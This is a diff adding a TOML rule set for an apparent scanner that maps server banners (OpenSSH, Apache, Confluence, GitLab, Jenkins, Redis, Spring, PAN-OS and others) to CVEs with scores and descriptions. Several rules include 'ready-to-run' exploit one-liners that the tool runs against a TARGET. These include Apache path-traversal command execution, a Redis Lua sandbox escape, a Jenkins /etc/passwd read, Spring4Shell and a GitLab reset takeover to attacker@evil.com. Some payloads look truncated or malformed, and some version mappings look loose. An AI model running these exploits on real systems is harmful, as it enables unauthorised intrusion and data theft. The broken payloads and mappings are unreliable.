@@ -1,0 +1,316 @@
+# Community CVE Rules — 2024-2026 Critical Vulnerabilities
+#
+# Add new rules here. Each entry maps a banner substring to a CVE.
+# Pattern matching is case-insensitive.
+#
+# Fields:
+#   pattern     — substring to search for in TCP/HTTP banners (case-insensitive)
+#   cve         — CVE identifier
+#   cvss        — CVSS v3 base score (0.0 – 10.0)
+#   severity    — "critical", "high", "medium", "low", "info"
+#   description — human-readable description
+#   exploit     — optional; ready-to-run PoC (TARGET is replaced at runtime)
+
+# ── OpenSSH ─────────────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "openssh_9.1"
+cve = "CVE-2023-38408"
+cvss = 9.8
+severity = "critical"
+description = "OpenSSH 9.1 — PKCS#11 agent forwarding RCE. An attacker with access to the remote SSH agent can load arbitrary shared libraries from the forwarded agent."
+exploit = "ssh-agent-exploit TARGET"
+
+[[rule]]
+pattern = "openssh_8.5"
+cve = "CVE-2024-6387"
+cvss = 8.1
+severity = "high"
+description = "OpenSSH 8.5-9.7 — regreSSHion race condition in signal handler. Remote unauthenticated code execution via SIGALRM race in sshd on glibc-based systems."
+exploit = "# Requires ~10k connections over hours — see regreSSHion PoC"
+
+[[rule]]
+pattern = "openssh_9.7"
+cve = "CVE-2024-6387"
+cvss = 8.1
+severity = "high"
+description = "OpenSSH 9.7 — regreSSHion race condition (patched in 9.8)."
+
+[[rule]]
+pattern = "openssh_9.3"
+cve = "CVE-2023-51385"
+cvss = 6.5
+severity = "medium"
+description = "OpenSSH 9.3 — OS command injection via ProxyCommand/ProxyJump with user-supplied hostnames containing shell metacharacters."
+
+# ── Apache HTTP Server ──────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "apache/2.4.49"
+cve = "CVE-2021-41773"
+cvss = 9.8
+severity = "critical"
+description = "Apache 2.4.49 — path traversal and RCE via mod_cgi. URL-encoded dots bypass path normalization."
+exploit = "curl -s 'http://TARGET/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh' -d 'echo Content-Type: text/plain; echo; id'"
+
+[[rule]]
+pattern = "apache/2.4.50"
+cve = "CVE-2021-42013"
+cvss = 9.8
+severity = "critical"
+description = "Apache 2.4.50 — incomplete fix for CVE-2021-41773 path traversal. Double-URL-encoding bypass."
+exploit = "curl -s 'http://TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/bin/sh' -d 'echo Content-Type: text/plain; echo; id'"
+
+[[rule]]
+pattern = "apache/2.4.51"
+cve = "CVE-2022-22720"
+cvss = 9.8
+severity = "critical"
+description = "Apache 2.4.51 — HTTP request smuggling via malformed Transfer-Encoding."
+
+[[rule]]
+pattern = "apache/2.4.54"
+cve = "CVE-2022-36760"
+cvss = 9.0
+severity = "critical"
+description = "Apache 2.4.54 — HTTP request smuggling in mod_proxy_ajp. Allows prefix injection to the AJP backend."
+
+# ── Nginx ───────────────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "nginx/1.25"
+cve = "CVE-2024-24989"
+cvss = 7.5
+severity = "high"
+description = "Nginx 1.25 — HTTP/3 QUIC null pointer dereference. Specially crafted QUIC packets crash the worker process."
+
+[[rule]]
+pattern = "nginx/1.23"
+cve = "CVE-2022-41741"
+cvss = 7.8
+severity = "high"
+description = "Nginx 1.23 — mp4 module buffer overwrite. Crafted mp4 files trigger memory corruption."
+
+# ── Microsoft Exchange / IIS ────────────────────────────────────────────────
+
+[[rule]]
+pattern = "microsoft-iis/10.0"
+cve = "CVE-2023-36899"
+cvss = 8.8
+severity = "high"
+description = "IIS 10.0 — privilege escalation via ASP.NET when machine keys are compromised."
+
+[[rule]]
+pattern = "exchange server 2019"
+cve = "CVE-2024-21410"
+cvss = 9.8
+severity = "critical"
+description = "Exchange Server 2019 — NTLM relay privilege escalation. Attacker relays NTLM credentials to authenticate as the victim."
+
+# ── Confluence / Atlassian ──────────────────────────────────────────────────
+
+[[rule]]
+pattern = "confluence"
+cve = "CVE-2023-22515"
+cvss = 10.0
+severity = "critical"
+description = "Atlassian Confluence — broken access control allows unauthenticated admin account creation."
+exploit = "curl -s 'http://TARGET/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false'"
+
+[[rule]]
+pattern = "confluence/8.5"
+cve = "CVE-2024-21683"
+cvss = 8.8
+severity = "high"
+description = "Confluence 8.5 — authenticated RCE via OGNL injection in macro rendering."
+
+# ── GitLab ──────────────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "gitlab"
+cve = "CVE-2023-7028"
+cvss = 10.0
+severity = "critical"
+description = "GitLab — account takeover via password reset email sent to unverified addresses."
+exploit = "curl -s 'http://TARGET/users/password' -d 'user[email][]=target@victim.com&user[email][]=attacker@evil.com'"
+
+# ── Fortinet / VPN ──────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "fortigate"
+cve = "CVE-2024-21762"
+cvss = 9.8
+severity = "critical"
+description = "FortiOS — out-of-bounds write in SSL VPN. Unauthenticated RCE via crafted HTTP requests."
+
+[[rule]]
+pattern = "fortios"
+cve = "CVE-2024-23113"
+cvss = 9.8
+severity = "critical"
+description = "FortiOS — format string vulnerability in fgfmd daemon. Unauthenticated RCE."
+
+[[rule]]
+pattern = "pulse secure"
+cve = "CVE-2024-21888"
+cvss = 8.8
+severity = "high"
+description = "Ivanti Connect Secure (Pulse) — privilege escalation via web component."
+
+# ── Ivanti ──────────────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "ivanti"
+cve = "CVE-2024-21887"
+cvss = 9.1
+severity = "critical"
+description = "Ivanti Connect Secure/Policy Secure — command injection in web components. Chained with CVE-2023-46805 for unauthenticated RCE."
+
+# ── Jenkins ─────────────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "jenkins"
+cve = "CVE-2024-23897"
+cvss = 9.8
+severity = "critical"
+description = "Jenkins — arbitrary file read via CLI argument parser. Unauthenticated attackers can read first few lines of arbitrary files including secrets."
+exploit = "java -jar jenkins-cli.jar -s http://TARGET/ connect-node '@/etc/passwd'"
+
+[[rule]]
+pattern = "jenkins/2.4"
+cve = "CVE-2024-43044"
+cvss = 8.8
+severity = "high"
+description = "Jenkins — agent-to-controller file read. Build agents can read arbitrary files from the Jenkins controller."
+
+# ── Grafana ─────────────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "grafana"
+cve = "CVE-2024-9264"
+cvss = 9.8
+severity = "critical"
+description = "Grafana — SQL Expressions arbitrary command execution. Any Grafana Viewer can execute arbitrary DuckDB SQL including system commands."
+
+# ── Elasticsearch ───────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "elasticsearch/7"
+cve = "CVE-2021-22145"
+cvss = 6.5
+severity = "medium"
+description = "Elasticsearch 7.x — memory disclosure via error responses."
+
+[[rule]]
+pattern = "elasticsearch/8"
+cve = "CVE-2023-31419"
+cvss = 7.5
+severity = "high"
+description = "Elasticsearch 8.x — stack overflow via deeply nested aggregations. DoS."
+
+# ── Redis ───────────────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "redis_version:6"
+cve = "CVE-2022-0543"
+cvss = 10.0
+severity = "critical"
+description = "Redis 6.x on Debian/Ubuntu — Lua sandbox escape via package.loadlib. Full RCE."
+exploit = "redis-cli -h TARGET eval 'local io_l = package.loadlib(\"/usr/lib/x86_64-linux-gnu/liblua5.1.so.0\", \"luaopen_io\"); local io = io_l(); local f = io.popen(\"id\",\"r\"); local res = f:read(\"*a\"); f:close(); return res' 0"
+
+# ── RabbitMQ ────────────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "rabbitmq"
+cve = "CVE-2023-46118"
+cvss = 5.5
+severity = "medium"
+description = "RabbitMQ — HTTP API DoS via crafted multipart content negotiation."
+
+# ── Kubernetes ──────────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "kubelet"
+cve = "CVE-2024-3177"
+cvss = 5.9
+severity = "medium"
+description = "Kubelet — bypassable seccomp profile restrictions via ImagePolicyWebhook."
+
+# ── MySQL / MariaDB ─────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "mariadb-10"
+cve = "CVE-2023-22084"
+cvss = 4.9
+severity = "medium"
+description = "MariaDB 10.x — server crash via crafted query in optimizer."
+
+[[rule]]
+pattern = "mysql  8.0"
+cve = "CVE-2024-20960"
+cvss = 6.5
+severity = "medium"
+description = "MySQL 8.0 — DoS via crafted privilege operations."
+
+# ── PostgreSQL ──────────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "postgresql 15"
+cve = "CVE-2024-10979"
+cvss = 8.8
+severity = "high"
+description = "PostgreSQL 15 — environment variable manipulation in PL/Perl allows arbitrary code execution."
+
+[[rule]]
+pattern = "postgresql 16"
+cve = "CVE-2024-10979"
+cvss = 8.8
+severity = "high"
+description = "PostgreSQL 16 — environment variable manipulation in PL/Perl allows arbitrary code execution."
+
+# ── Spring / Java ───────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "spring"
+cve = "CVE-2022-22965"
+cvss = 9.8
+severity = "critical"
+description = "Spring Framework — Spring4Shell class loader manipulation RCE via data binding."
+exploit = "curl -s 'http://TARGET/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B'"
+
+# ── Telerik ─────────────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "telerik"
+cve = "CVE-2019-18935"
+cvss = 9.8
+severity = "critical"
+description = "Telerik UI — .NET deserialization RCE. The RadAsyncUpload handler deserializes attacker-controlled data."
+
+# ── SonicWall ───────────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "sonicwall"
+cve = "CVE-2024-40766"
+cvss = 9.3
+severity = "critical"
+description = "SonicWall SonicOS — improper access control. Authentication bypass affecting SSLVPN."
+
+# ── Palo Alto ───────────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "pan-os"
+cve = "CVE-2024-3400"
+cvss = 10.0
+severity = "critical"
+description = "Palo Alto PAN-OS — command injection in GlobalProtect gateway. Unauthenticated RCE actively exploited in the wild."
+exploit = "curl -s 'https://TARGET/ssl-vpn/hipreport.esp' -d 'user=a]%0aenv%0a['"
+
+# ── Zimbra ──────────────────────────────────────────────────────────────────
+
+[[rule]]
+pattern = "zimbra"
+cve = "CVE-2024-45519"
+cvss = 10.0
+severity = "critical"
+description = "Zimbra — unauthenticated RCE via postjournal SMTP smuggling."
